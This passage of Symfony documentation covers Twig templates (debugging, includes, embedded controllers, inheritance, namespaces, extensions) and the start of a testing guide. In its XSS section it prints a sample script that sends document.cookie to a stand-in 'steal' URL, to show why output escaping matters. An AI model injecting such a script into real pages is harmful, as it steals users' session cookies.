``debug:twig`` command lists all the information available about Twig\n(functions, filters, global variables, etc.). It's useful to check if your\n:ref:`custom Twig extensions <templates-twig-extension>` are working properly\nand also to check the Twig features added when :ref:`installing packages <symfony-flex>`:\n\n.. code-block:: terminal\n\n    # list general information\n    $ php bin/console debug:twig\n\n    # filter output by any keyword\n    $ php bin/console debug:twig --filter=date\n\n    # pass a template path to show the physical file which will be loaded\n    $ php bin/console debug:twig @Twig/Exception/error.html.twig\n\n.. _twig-dump-utilities:\n\nThe Dump Twig Utilities\n~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides a :ref:`dump() function <components-var-dumper-dump>` as an\nimproved alternative to PHP's ``var_dump()`` function. This function is useful\nto inspect the contents of any variable and you can use it in Twig templates too.\n\nFirst, make sure that the VarDumper component is installed in the application:\n\n.. code-block:: terminal\n\n    $ composer require --dev symfony/debug-bundle\n\nThen, use either the ``{% dump %}`` tag or the ``{{ dump() }}`` function\ndepending on your needs:\n\n.. code-block:: html+twig\n\n    {# templates/article/recent_list.html.twig #}\n    {# the contents of this variable are sent to the Web Debug Toolbar\n       instead of dumping them inside the page contents #}\n    {% dump articles %}\n\n    {% for article in articles %}\n        {# the contents of this variable are dumped inside the page contents\n           and they are visible on the web page #}\n        {{ dump(article) }}\n\n        {# optionally, use named arguments to display them as labels next to\n           the dumped contents #}\n        {{ dump(blog_posts: articles, user: app.user) }}\n\n        <a href=\"/article/{{ article.slug }}\">\n            {{ article.title }}\n        </a>\n    {% endfor %}\n\nTo avoid leaking sensitive information, the ``dump()`` function/tag is only\navailable in the ``dev`` and ``test`` :ref:`configuration environments <configuration-environments>`.\nIf you try to use it in the ``prod`` environment, you will see a PHP error.\n\n.. _templates-reuse-contents:\n\nReusing Template Contents\n-------------------------\n\n.. _templates-include:\n\nIncluding Templates\n~~~~~~~~~~~~~~~~~~~\n\nIf certain Twig code is repeated in several templates, you can extract it into a\nsingle \"template fragment\" and include it in other templates. Imagine that the\nfollowing code to display the user information is repeated in several places:\n\n.. code-block:: html+twig\n\n    {# templates/blog/index.html.twig #}\n\n    {# ... #}\n    <div class=\"user-profile\">\n        <img src=\"{{ user.profileImageUrl }}\" alt=\"{{ user.fullName }}\"/>\n        <p>{{ user.fullName }} - {{ user.email }}</p>\n    </div>\n\nFirst, create a new Twig template called ``blog/_user_profile.html.twig`` (the\n``_`` prefix is optional, but it's a convention used to better differentiate\nbetween full templates and template fragments).\n\nThen, remove that content from the original ``blog/index.html.twig`` template\nand add the following to include the template fragment:\n\n.. code-block:: twig\n\n    {# templates/blog/index.html.twig #}\n\n    {# ... #}\n    {{ include('blog/_user_profile.html.twig') }}\n\nThe ``include()`` Twig function takes as argument the path of the template to\ninclude. The included template has access to all the variables of the template\nthat includes it (use the `with_context`_ option to control this).\n\nYou can also pass variables to the included template. This is useful for example\nto rename variables. Imagine that your template stores the user information in a\nvariable called ``blog_post.author`` instead of the ``user`` variable that the\ntemplate fragment expects. Use the following to *rename* the variable:\n\n.. code-block:: twig\n\n    {# templates/blog/index.html.twig #}\n\n    {# ... #}\n    {{ include('blog/_user_profile.html.twig', {user: blog_post.author}) }}\n\n.. _templates-embed-controllers:\n\nEmbedding Controllers\n~~~~~~~~~~~~~~~~~~~~~\n\n:ref:`Including template fragments <templates-include>` is useful to reuse the\nsame content on several pages. However, this technique is not the best solution\nin some cases.\n\nImagine that the template fragment displays the three most recent blog articles.\nTo do that, it needs to make a database query to get those articles. When using\nthe ``include()`` function, you'd need to do the same database query in every\npage that includes the fragment. This is not very convenient.\n\nA better alternative is to **embed the result of executing some controller**\nwith the ``render()`` and ``controller()`` Twig functions.\n\nFirst, create the controller that renders a certain number of recent articles::\n\n    // src/Controller/BlogController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    // ...\n\n    class BlogController extends AbstractController\n    {\n        public function recentArticles(int $max = 3): Response\n        {\n            // get the recent articles somehow (e.g. making a database query)\n            $articles = ['...', '...', '...'];\n\n            return $this->render('blog/_recent_articles.html.twig', [\n                'articles' => $articles\n            ]);\n        }\n    }\n\nThen, create the ``blog/_recent_articles.html.twig`` template fragment (the\n``_`` prefix in the template name is optional, but it's a convention used to\nbetter differentiate between full templates and template fragments):\n\n.. code-block:: html+twig\n\n    {# templates/blog/_recent_articles.html.twig #}\n    {% for article in articles %}\n        <a href=\"{{ path('blog_show', {slug: article.slug}) }}\">\n            {{ article.title }}\n        </a>\n    {% endfor %}\n\nNow you can call to this controller from any template to embed its result:\n\n.. code-block:: html+twig\n\n    {# templates/base.html.twig #}\n\n    {# ... #}\n    <div id=\"sidebar\">\n        {# if the controller is associated with a route, use the path() or url() functions #}\n        {{ render(path('latest_articles', {max: 3})) }}\n        {{ render(url('latest_articles', {max: 3})) }}\n\n        {# if you don't want to expose the controller with a public URL,\n           use the controller() function to define the controller to execute #}\n        {{ render(controller(\n            'App\\\\Controller\\\\BlogController::recentArticles', {max: 3}\n        )) }}\n    </div>\n\n.. _fragments-path-config:\n\nWhen using the ``controller()`` function, controllers are not accessed using a\nregular Symfony route but through a special URL used exclusively to serve those\ntemplate fragments. Configure that special URL in the ``fragments`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            # ...\n            fragments: { path: /_fragment }\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:fragment path=\"/_fragment\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->fragments()->path('/_fragment');\n        };\n\n.. warning::\n\n    Embedding controllers requires making requests to those controllers and\n    rendering some templates as result. This can have a significant impact on\n    the application performance if you embed lots of controllers. If possible,\n    :doc:`cache the template fragment </http_cache/esi>`.\n\n.. _templates-hinclude:\n\nHow to Embed Asynchronous Content with hinclude.js\n--------------------------------------------------\n\nTemplates can also embed contents asynchronously with the ``hinclude.js``\nJavaScript library.\n\nFirst, include the `hinclude.js`_ library in your page\n:ref:`linking to it <templates-link-to-assets>` from the template or adding it\nto your application JavaScript :doc:`using AssetMapper </frontend>`.\n\nAs the embedded content comes from another page (or controller for that matter),\nSymfony uses a version of the standard ``render()`` function to configure\n``hinclude`` tags in templates:\n\n.. code-block:: twig\n\n    {{ render_hinclude(controller('...')) }}\n    {{ render_hinclude(url('...')) }}\n\n.. note::\n\n    When using the ``controller()`` function, you must also configure the\n    :ref:`fragments path option <fragments-path-config>`.\n\nWhen JavaScript is disabled or it takes a long time to load you can display a\ndefault content rendering some template:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            # ...\n            fragments:\n                hinclude_default_template: hinclude.html.twig\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:fragments hinclude-default-template=\"hinclude.html.twig\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->fragments()\n                ->hincludeDefaultTemplate('hinclude.html.twig')\n            ;\n        };\n\nYou can define default templates per ``render()`` function (which will override\nany global default template that is defined):\n\n.. code-block:: twig\n\n    {{ render_hinclude(controller('...'),  {\n        default: 'default/content.html.twig'\n    }) }}\n\nOr you can also specify a string to display as the default content:\n\n.. code-block:: twig\n\n    {{ render_hinclude(controller('...'), {default: 'Loading...'}) }}\n\nUse the ``attributes`` option to define the value of hinclude.js options:\n\n.. code-block:: twig\n\n    {# by default, cross-site requests don't use credentials such as cookies, authorization\n       headers or TLS client certificates; set this option to 'true' to use them #}\n    {{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}\n\n    {# by default, the JavaScript code included in the loaded contents is not run;\n       set this option to 'true' to run that JavaScript code #}\n    {{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}\n\n.. _template_inheritance-layouts:\n\nTemplate Inheritance and Layouts\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAs your application grows you'll find more and more repeated elements between\npages, such as headers, footers, sidebars, etc. :ref:`Including templates <templates-include>`\nand :ref:`embedding controllers <templates-embed-controllers>` can help, but\nwhen pages share a common structure, it's better to use **inheritance**.\n\nThe concept of `Twig template inheritance`_ is similar to PHP class inheritance.\nYou define a parent template that other templates can extend from and child\ntemplates can override parts of the parent template.\n\nSymfony recommends the following three-level template inheritance for medium and\ncomplex applications:\n\n* ``templates/base.html.twig``, defines the common elements of all application\n  templates, such as ``<head>``, ``<header>``, ``<footer>``, etc.;\n* ``templates/layout.html.twig``, extends from ``base.html.twig`` and defines\n  the content structure used in all or most of the pages, such as a two-column\n  content + sidebar layout. Some sections of the application can define their\n  own layouts (e.g. ``templates/blog/layout.html.twig``);\n* ``templates/*.html.twig``, the application pages which extend from the main\n  ``layout.html.twig`` template or any other section layout.\n\nIn practice, the ``base.html.twig`` template would look like this:\n\n.. code-block:: html+twig\n\n    {# templates/base.html.twig #}\n    <!DOCTYPE html>\n    <html>\n        <head>\n            <meta charset=\"UTF-8\">\n            <title>{% block title %}My Application{% endblock %}</title>\n            {% block stylesheets %}\n                <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/base.css\"/>\n            {% endblock %}\n        </head>\n        <body>\n            {% block body %}\n                <div id=\"sidebar\">\n                    {% block sidebar %}\n                        <ul>\n                            <li><a href=\"{{ path('homepage') }}\">Home</a></li>\n                            <li><a href=\"{{ path('blog_index') }}\">Blog</a></li>\n                        </ul>\n                    {% endblock %}\n                </div>\n\n                <div id=\"content\">\n                    {% block content %}{% endblock %}\n                </div>\n            {% endblock %}\n        </body>\n    </html>\n\nThe `Twig block tag`_ defines the page sections that can be overridden in the\nchild templates. They can be empty, like the ``content`` block or define a default\ncontent, like the ``title`` block, which is displayed when child templates don't\noverride them.\n\nThe ``blog/layout.html.twig`` template could be like this:\n\n.. code-block:: html+twig\n\n    {# templates/blog/layout.html.twig #}\n    {% extends 'base.html.twig' %}\n\n    {% block content %}\n        <h1>Blog</h1>\n\n        {% block page_contents %}{% endblock %}\n    {% endblock %}\n\nThe template extends from ``base.html.twig`` and only defines the contents of\nthe ``content`` block. The rest of the parent template blocks will display their\ndefault contents. However, they can be overridden by the third-level inheritance\ntemplate, such as ``blog/index.html.twig``, which displays the blog index:\n\n.. code-block:: html+twig\n\n    {# templates/blog/index.html.twig #}\n    {% extends 'blog/layout.html.twig' %}\n\n    {% block title %}Blog Index{% endblock %}\n\n    {% block page_contents %}\n        {% for article in articles %}\n            <h2>{{ article.title }}</h2>\n            <p>{{ article.body }}</p>\n        {% endfor %}\n    {% endblock %}\n\nThis template extends from the second-level template (``blog/layout.html.twig``)\nbut overrides blocks of different parent templates: ``page_contents`` from\n``blog/layout.html.twig`` and ``title`` from ``base.html.twig``.\n\nWhen you render the ``blog/index.html.twig`` template, Symfony uses three\ndifferent templates to create the final contents. This inheritance mechanism\nboosts your productivity because each template includes only its unique contents\nand leaves the repeated contents and HTML structure to some parent templates.\n\n.. warning::\n\n    When using ``extends``, a child template is forbidden to define template\n    parts outside of a block. The following code throws a ``SyntaxError``:\n\n    .. code-block:: html+twig\n\n        {# templates/blog/index.html.twig #}\n        {% extends 'base.html.twig' %}\n\n        {# the line below is not captured by a \"block\" tag #}\n        <div class=\"alert\">Some Alert</div>\n\n        {# the following is valid #}\n        {% block content %}My cool blog posts{% endblock %}\n\nRead the `Twig template inheritance`_ docs to learn more about how to reuse\nparent block contents when overriding templates and other advanced features.\n\n.. _output-escaping:\n.. _xss-attacks:\n\nOutput Escaping and XSS Attacks\n-------------------------------\n\nImagine that your template includes the ``Hello {{ name }}`` code to display the\nuser name and a malicious user sets the following as their name:\n\n.. code-block:: html\n\n    My Name\n    <script type=\"text/javascript\">\n        document.write('<img src=\"https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '\" style=\"display:none;\">');\n    </script>\n\nYou'll see ``My Name`` on screen but the attacker just secretly stole your cookies\nso they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_\nor XSS attack.\n\nTo prevent this attack, use *\"output escaping\"* to transform the characters\nwhich have special meaning (e.g. replace ``<`` by the ``&lt;`` HTML entity).\nSymfony applications are safe by default because they perform automatic output\nescaping:\n\n.. code-block:: html+twig\n\n    <p>Hello {{ name }}</p>\n    {# if 'name' is '<script>alert('hello!')</script>', Twig will output this:\n       '<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}\n\nIf you are rendering a variable that is trusted and contains HTML contents,\nuse the `Twig raw filter`_ to disable the output escaping for that variable:\n\n.. code-block:: html+twig\n\n    <h1>{{ product.title|raw }}</h1>\n    {# if 'product.title' is 'Lorem <strong>Ipsum</strong>', Twig will output\n       exactly that instead of 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}\n\nRead the `Twig output escaping docs`_ to learn more about how to disable output\nescaping for a block or even an entire template.\n\n.. _templates-namespaces:\n\nTemplate Namespaces\n-------------------\n\nAlthough most applications store their templates in the default ``templates/``\ndirectory, you may need to store some or all of them in different directories.\nUse the ``twig.paths`` option to configure those extra directories. Each path is\ndefined as a ``key: value`` pair where the ``key`` is the template directory and\nthe ``value`` is the Twig namespace, which is explained later:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n            paths:\n                # directories are relative to the project root dir (but you\n                # can also use absolute directories)\n                'email/default/templates': ~\n                'backend/templates': ~\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n                <!-- directories are relative to the project root dir (but you\n                     can also use absolute directories -->\n                <twig:path>email/default/templates</twig:path>\n                <twig:path>backend/templates</twig:path>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            // directories are relative to the project root dir (but you\n            // can also use absolute directories)\n            $twig->path('email/default/templates', null);\n            $twig->path('backend/templates', null);\n        };\n\nWhen rendering a template, Symfony looks for it first in the ``twig.paths``\ndirectories that don't define a namespace and then falls back to the default\ntemplate directory (usually, ``templates/``).\n\nUsing the above configuration, if your application renders for example the\n``layout.html.twig`` template, Symfony will first look for\n``email/default/templates/layout.html.twig`` and ``backend/templates/layout.html.twig``.\nIf any of those templates exists, Symfony will use it instead of using\n``templates/layout.html.twig``, which is probably the template you wanted to use.\n\nTwig solves this problem with **namespaces**, which group several templates\nunder a logic name unrelated to their actual location. Update the previous\nconfiguration to define a namespace for each template directory:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n            paths:\n                'email/default/templates': 'email'\n                'backend/templates': 'admin'\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n                <twig:path namespace=\"email\">email/default/templates</twig:path>\n                <twig:path namespace=\"admin\">backend/templates</twig:path>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            $twig->path('email/default/templates', 'email');\n            $twig->path('backend/templates', 'admin');\n        };\n\nNow, if you render the ``layout.html.twig`` template, Symfony will render the\n``templates/layout.html.twig`` file. Use the special syntax ``@`` + namespace to\nrefer to the other namespaced templates (e.g. ``@email/layout.html.twig`` and\n``@admin/layout.html.twig``).\n\n.. note::\n\n    A single Twig namespace can be associated with more than one template\n    directory. In that case, the order in which paths are added is important\n    because Twig will start looking for templates from the first defined path.\n\nBundle Templates\n~~~~~~~~~~~~~~~~\n\nIf you :ref:`install packages/bundles <symfony-flex>` in your application, they\nmay include their own Twig templates (in the ``Resources/views/`` directory of\neach bundle). To avoid messing with your own templates, Symfony adds bundle\ntemplates under an automatic namespace created after the bundle name.\n\nFor example, the templates of a bundle called ``AcmeBlogBundle`` are available\nunder the ``AcmeBlog`` namespace. If this bundle includes the template\n``<your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig``,\nyou can refer to it as ``@AcmeBlog/user/profile.html.twig``.\n\n.. tip::\n\n    You can also :ref:`override bundle templates <override-templates>` in case\n    you want to change some parts of the original bundle templates.\n\n.. _templates-twig-extension:\n\nWriting a Twig Extension\n------------------------\n\n`Twig Extensions`_ allow the creation of custom functions, filters, and more to use\nin your Twig templates. Before writing your own Twig extension, check if\nthe filter/function that you need is not already implemented in:\n\n* The `default Twig filters and functions`_;\n* The :doc:`Twig filters and functions added by Symfony </reference/twig_reference>`;\n* The `official Twig extensions`_ related to strings, HTML, Markdown, internationalization, etc.\n\nCreate the Extension Class\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSuppose you want to create a new filter called ``price`` that formats a number\nas currency:\n\n.. code-block:: twig\n\n    {{ product.price|price }}\n\n    {# pass in the 3 optional arguments #}\n    {{ product.price|price(2, ',', '.') }}\n\nCreate a class that extends ``AbstractExtension`` and fill in the logic::\n\n    // src/Twig/AppExtension.php\n    namespace App\\Twig;\n\n    use Twig\\Extension\\AbstractExtension;\n    use Twig\\TwigFilter;\n\n    class AppExtension extends AbstractExtension\n    {\n        public function getFilters(): array\n        {\n            return [\n                new TwigFilter('price', [$this, 'formatPrice']),\n            ];\n        }\n\n        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string\n        {\n            $price = number_format($number, $decimals, $decPoint, $thousandsSep);\n            $price = '$'.$price;\n\n            return $price;\n        }\n    }\n\nIf you want to create a function instead of a filter, define the\n``getFunctions()`` method::\n\n    // src/Twig/AppExtension.php\n    namespace App\\Twig;\n\n    use Twig\\Extension\\AbstractExtension;\n    use Twig\\TwigFunction;\n\n    class AppExtension extends AbstractExtension\n    {\n        public function getFunctions(): array\n        {\n            return [\n                new TwigFunction('area', [$this, 'calculateArea']),\n            ];\n        }\n\n        public function calculateArea(int $width, int $length): int\n        {\n            return $width * $length;\n        }\n    }\n\n.. tip::\n\n    Along with custom filters and functions, you can also register\n    `global variables`_.\n\nRegister an Extension as a Service\n..................................\n\nNext, register your class as a service and tag it with ``twig.extension``. If you're\nusing the :ref:`default services.yaml configuration <service-container-services-load-example>`,\nyou're done! Symfony will automatically know about your new service and add the tag.\n\nYou can now start using your filter in any Twig template. Optionally, execute\nthis command to confirm that your new filter was successfully registered:\n\n.. code-block:: terminal\n\n    # display all information about Twig\n    $ php bin/console debug:twig\n\n    # display only the information about a specific filter\n    $ php bin/console debug:twig --filter=price\n\n.. _lazy-loaded-twig-extensions:\n\nCreating Lazy-Loaded Twig Extensions\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIncluding the code of the custom filters/functions in the Twig extension class\nis the simplest way to create extensions. However, Twig must initialize all\nextensions before rendering any template, even if the template doesn't use an\nextension.\n\nIf extensions don't define dependencies (i.e. if you don't inject services in\nthem) performance is not affected. However, if extensions define lots of complex\ndependencies (e.g. those making database connections), the performance loss can\nbe significant.\n\nThat's why Twig allows decoupling the extension definition from its\nimplementation. Following the same example as before, the first change would be\nto remove the ``formatPrice()`` method from the extension and update the PHP\ncallable defined in ``getFilters()``::\n\n    // src/Twig/AppExtension.php\n    namespace App\\Twig;\n\n    use App\\Twig\\AppRuntime;\n    use Twig\\Extension\\AbstractExtension;\n    use Twig\\TwigFilter;\n\n    class AppExtension extends AbstractExtension\n    {\n        public function getFilters(): array\n        {\n            return [\n                // the logic of this filter is now implemented in a different class\n                new TwigFilter('price', [AppRuntime::class, 'formatPrice']),\n            ];\n        }\n    }\n\nThen, create the new ``AppRuntime`` class (it's not required but these classes\nare suffixed with ``Runtime`` by convention) and include the logic of the\nprevious ``formatPrice()`` method::\n\n    // src/Twig/AppRuntime.php\n    namespace App\\Twig;\n\n    use Twig\\Extension\\RuntimeExtensionInterface;\n\n    class AppRuntime implements RuntimeExtensionInterface\n    {\n        public function __construct()\n        {\n            // this simple example doesn't define any dependency, but in your own\n            // extensions, you'll need to inject services using this constructor\n        }\n\n        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string\n        {\n            $price = number_format($number, $decimals, $decPoint, $thousandsSep);\n            $price = '$'.$price;\n\n            return $price;\n        }\n    }\n\nIf you're using the default ``services.yaml`` configuration, this will already\nwork! Otherwise, :ref:`create a service <service-container-creating-service>`\nfor this class and :doc:`tag your service </service_container/tags>` with ``twig.runtime``.\n\n.. _`Cross-Site Scripting`: https://en.wikipedia.org/wiki/Cross-site_scripting\n.. _`default Twig filters and functions`: https://twig.symfony.com/doc/3.x/#reference\n.. _`filters`: https://twig.symfony.com/doc/3.x/filters/index.html\n.. _`functions`: https://twig.symfony.com/doc/3.x/functions/index.html\n.. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions\n.. _`global variables`: https://twig.symfony.com/doc/3.x/advanced.html#id1\n.. _`hinclude.js`: https://mnot.github.io/hinclude/\n.. _`Turbo Streams`: https://symfony.com/bundles/ux-turbo/current/index.html\n.. _`official Twig extensions`: https://github.com/twigphp?q=extra\n.. _`snake case`: https://en.wikipedia.org/wiki/Snake_case\n.. _`tags`: https://twig.symfony.com/doc/3.x/tags/index.html\n.. _`Twig block tag`: https://twig.symfony.com/doc/3.x/tags/block.html\n.. _`Twig Environment`: https://github.com/twigphp/Twig/blob/3.x/src/Environment.php\n.. _`Twig Extensions`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension\n.. _`Twig output escaping docs`: https://twig.symfony.com/doc/3.x/api.html#escaper-extension\n.. _`Twig raw filter`: https://twig.symfony.com/doc/3.x/filters/raw.html\n.. _`Twig template inheritance`: https://twig.symfony.com/doc/3.x/tags/extends.html\n.. _`Twig template loader`: https://twig.symfony.com/doc/3.x/api.html#loaders\n.. _`Twig`: https://twig.symfony.com\n.. _`UX Live Component`: https://symfony.com/bundles/ux-live-component/current/index.html\n.. _`UX Twig Component`: https://symfony.com/bundles/ux-twig-component/current/index.html\n.. _`with_context`: https://twig.symfony.com/doc/3.x/functions/include.html\n"
        },
        {
          "name": "testing.rst",
          "type": "blob",
          "size": 44.5732421875,
          "content": "Testing\n=======\n\nWhenever you write a new line of code, you also potentially add new bugs.\nTo build better and more reliable applications, you should test your code\nusing both functional and unit tests.\n\n.. _testing-installation:\n\nThe PHPUnit Testing Framework\n-----------------------------\n\nSymfony integrates with an independent library called `PHPUnit`_ to give\nyou a rich testing framework. This article won't cover PHPUnit itself,\nwhich has its own excellent `documentation`_.\n\nBefore creating your first test, install ``symfony/test-pack``, which installs\nsome other packages needed for testing (such as ``phpunit/phpunit``):\n\n.. code-block:: terminal\n\n    $ composer require --dev symfony/test-pack\n\nAfter the library is installed, try running PHPUnit:\n\n.. code-block:: terminal\n\n    $ php bin/phpunit\n\nThis command automatically runs your application tests. Each test is a\nPHP class ending with \"Test\" (e.g. ``BlogControllerTest``) that lives in\nthe ``tests/`` directory of your application.\n\nPHPUnit is configured by the ``phpunit.xml.dist`` file in the root of your\napplication. The default configuration provided by Symfony Flex will be\nenough in most cases. Read the `PHPUnit documentation`_ to discover all\npossible configuration options (e.g. to enable code coverage or to split\nyour test into multiple \"test suites\").\n\n.. note::\n\n    :ref:`Symfony Flex <symfony-flex>` automatically creates\n    ``phpunit.xml.dist`` and ``tests/bootstrap.php``. If these files are\n    missing, you can try running the recipe again using\n    ``composer recipes:install phpunit/phpunit --force -v``.\n\nTypes of Tests\n--------------\n\nThere are many types of automated tests and precise definitions often\ndiffer from project to project. In Symfony, the following definitions are\nused. If you have learned something different, that is not necessarily\nwrong, just different from what the Symfony documentation is using.\n\n`Unit Tests`_\n    These tests ensure that *individual* units of source code (e.g. a single\n    class) behave as intended.\n\n`Integration Tests`_\n    These tests test a combination of classes and commonly interact with\n    Symfony's service container. These tests do not yet cover the fully\n    working application, those are called *Application tests*.\n\n`Application Tests`_\n    Application tests test the behavior of a complete application. They\n    make HTTP requests (both real and simulated ones) and test that the\n    response is as expected.\n\nUnit Tests\n----------\n\nA `unit test`_ ensures that individual units of source code (e.g. a single\nclass or some specific method in some class) meet their design and behave\nas intended. Writing unit tests in a Symfony application is no different\nfrom writing standard PHPUnit unit tests. You can learn about it in the\nPHPUnit documentation: `Writing Tests for PHPUnit`_.\n\nBy convention, the ``tests/`` directory should replicate the directory\nof your application for unit tests. So, if you're testing a class in the\n``src/Form/`` directory, put the test in the ``tests/Form/`` directory.\nAutoloading is automatically enabled via the ``vendor/autoload.php`` file\n(as configured by default in the ``phpunit.xml.dist`` file).\n\nYou can run tests using the ``bin/phpunit`` command:\n\n.. code-block:: terminal\n\n    # run all tests of the application\n    $ php bin/phpunit\n\n    # run all tests in the Form/ directory\n    $ php bin/phpunit tests/Form\n\n    # run tests for the UserType class\n    $ php bin/phpunit tests/Form/UserTypeTest.php\n\n.. tip::\n\n    In large test suites, it can make sense to create subdirectories for\n    each type of test (``tests/Unit/``, ``tests/Integration/``,\n    ``tests/Application/``, etc.).\n\n.. _integration-tests:\n\nIntegration Tests\n-----------------\n\nAn integration test will test a larger part of your application compared to\na unit test (e.g. a combination of services). Integration tests might want\nto use the Symfony Kernel to fetch a service from the dependency injection\ncontainer.\n\nSymfony provides a :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\KernelTestCase`\nclass to help you creating and booting the kernel in your tests using\n``bootKernel()``::\n\n    // tests/Service/NewsletterGeneratorTest.php\n    namespace App\\Tests\\Service;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase;\n\n    class NewsletterGeneratorTest extends KernelTestCase\n    {\n        public function testSomething(): void\n        {\n            self::bootKernel();\n\n            // ...\n        }\n    }\n\nThe ``KernelTestCase`` also makes sure your kernel is rebooted for each\ntest. This assures that each test is run independently from each other.\n\nTo run your application tests, the ``KernelTestCase`` class needs to\nfind the application kernel to initialize. The kernel class is\nusually defined in the ``KERNEL_CLASS`` environment variable\n(included in the default ``.env.test`` file provided by Symfony Flex):\n\n.. code-block:: env\n\n    # .env.test\n    KERNEL_CLASS=App\\Kernel\n\n.. note::\n\n    If your use case is more complex, you can also override the\n    ``getKernelClass()`` or ``createKernel()`` methods of your functional\n    test, which takes precedence over the ``KERNEL_CLASS`` env var.\n\nSet-up your Test Environment\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe tests create a kernel that runs in the ``test``\n:ref:`environment <configuration-environments>`. This allows to have\nspecial settings for your tests inside ``config/packages/test/``.\n\nIf you have Symfony Flex installed, some packages already installed some\nuseful test configuration. For example, by default, the Twig bundle is\nconfigured to be especially strict to catch errors before deploying your\ncode to production:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/test/twig.yaml\n        twig:\n            strict_variables: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/test/twig.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig\n                https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <framework:config strict-variables=\"true\"/>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/test/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            $twig->strictVariables(true);\n        };\n\nYou can also use a different environment entirely, or override the default\ndebug mode (``true``) by passing each as options to the ``bootKernel()``\nmethod::\n\n    self::bootKernel([\n        'environment' => 'my_test_env',\n        